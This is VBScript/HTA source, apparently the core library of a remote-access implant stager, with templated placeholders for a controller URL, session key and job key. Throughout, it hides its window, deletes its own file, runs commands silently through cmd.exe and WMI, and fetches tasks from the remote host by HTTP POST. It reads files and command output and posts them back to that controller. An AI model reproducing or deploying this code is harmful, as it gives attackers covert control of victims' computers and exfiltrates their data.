On Error Resume Next

dim kows : set kows = CreateObject("WScript.Shell")
dim kofs : set kofs = CreateObject("Scripting.FileSystemObject")

dim stager : stager = "~URL~"
dim workpath : workpath = stager & "~WORKPATH~"
dim jobpath : jobpath = stager & "~JOBPATH~"
dim reportpath : reportpath = stager & "~REPORTPATH~"

dim sessionkey : sessionkey = "~SESSIONKEY~"
dim jobkey : jobkey = "~JOBKEY~"

sub KoNoFocus
  Window.blur
End sub

Sub Window_onLoad
    window.resizeTo 1,1
End Sub


window.resizeTo 1,1

' small cleanup
if isobject(window) then
    'Window.onfocus = GetRef("KoNoFocus")
    window.blur
else
    if isobject(wscript) then
        KoDeleteFile wscript.scriptfullname
    end if
end if

sub KoExit
    if isobject(window) then
        window.close
    else
        if isobject(wscript) then
          wscript.quit
        end if
    end if
end sub

sub KoExecWMI(cmd)
    on error resume next
    Const SW_HIDE = 0
    const Detached_Process = 8
    processID = 0
    Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set processConfig = wmi.Get("Win32_ProcessStartup").SpawnInstance_
    processConfig.ShowWindow = 6'8'SW_HIDE
    processConfig.X = 1
    processConfig.Y = 1
    'processConfig.createflags = 	528'Detached_Process ' tweak this value
    processConfig.xSize = 1
    processConfig.ySize = 1
    'MsgBox cmd
    retCode = wmi.Get("Win32_Process").Create( cmd, Null, processConfig, processID )

    if retCode <> 0 or err.number <> 0 then
        MsgBox "fail WMI" & err.number
    end if

end sub

function KoExecCmd(cmd, path)
    kows.Run "%comspec% /q /c " & cmd & " > " & path, 0, True
    KoExecCmd = KoReadFile(path)
    KoDeleteFile(path)
end function

function KoRunCmd(cmd, fork)
    kows.Run "%comspec% /q /c " & cmd, 0, Not(fork)
    KoRunCmd = True
end function

sub KoSleep(seconds)
    KoRunCmd "ping -n " & seconds & " 127.0.0.1", false
end sub

function KoGetPath(path)
    KoGetPath = kows.ExpandEnvironmentStrings(path)
end function

function KoReadFile(path)
    set file = kofs.OpenTextFile(path, 1, True, 0)
    KoReadFile = file.ReadAll
    file.Close
end function

sub KoWriteFile(path, data)
    set file = kofs.CreateTextFile(path, true)
    file.write(data)
    file.close
end sub

function KoReadBinaryFile(path)
    set file = kofs.GetFile(path)
    data = file.OpenAsTextStream().read(file.size)
    KoReadBinaryFile = data
end function

sub KoDeleteFile(path)
    kofs.DeleteFile path, True
end sub

function KoHttpPost(endpoint, data, headers)
    Err.Clear

    if isobject(Wscript) then
      Set http = CreateObject("Microsoft.XMLHTTP")
      http.open "POST", endpoint, false
    else
    ' this will usually be err70 (permission denied)
    'if err.number <> 0 then
        Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
        http.setTimeouts 30000, 30000, 30000, 0
        http.open "POST", endpoint, false
    end if

    http.setRequestHeader "sessionkey", sessionkey

    if VarType(headers) >= vbArray then
        count = 1
        header = ""
        for each val in headers
            if count Mod 2 <> 0 then
                header = val
            else
                if header <> "" then
                  http.setRequestHeader header, val
                end if
            end if

            count = count + 1
        next
    end if

    http.setrequestheader "Content-Type", "application/octet-stream"
    http.send data

    set KoHttpPost = http
end function

function KoGetWork()
    set KoGetWork = KoHttpPost(workpath, "", "")
end function

function KoArrayMerge(a1, a2)
    ReDim aTmp(KoArrayMergeSize(a1, a2))
    for i = 0 to UBound(a1)
        aTmp(i) = a1(i)
    next
    for j = 0 to UBound(a2)
        aTmp(i + j) = a2(j)
    next
    KoArrayMerge = aTmp
end function

function KoArrayMergeSize(a1, a2)
    KoArrayMergeSize = UBound(a1) + Ubound(a2) + 1
end function

Function KoMakeArray(n)
    Dim s
    s = Space(n)
    KoMakeArray = Split(s," ")
End Function



function KoReportWorkEx(data, headers)

    dim standard(3)
    standard(0) = "jobkey"
    standard(1) = jobkey
    standard(2) = "errno"
    standard(3) = Err.number

    Dim allheaders

    if VarType(headers) >= vbArray then
        allheaders = KoArrayMerge(standard, headers)
    else
        allheaders = standard
    end if

    set KoReportWorkEx = KoHttpPost(reportpath, data, allheaders)
end function

function KoReportWork(data)
    set KoReportWork = KoReportWorkEx(data, "")
end function
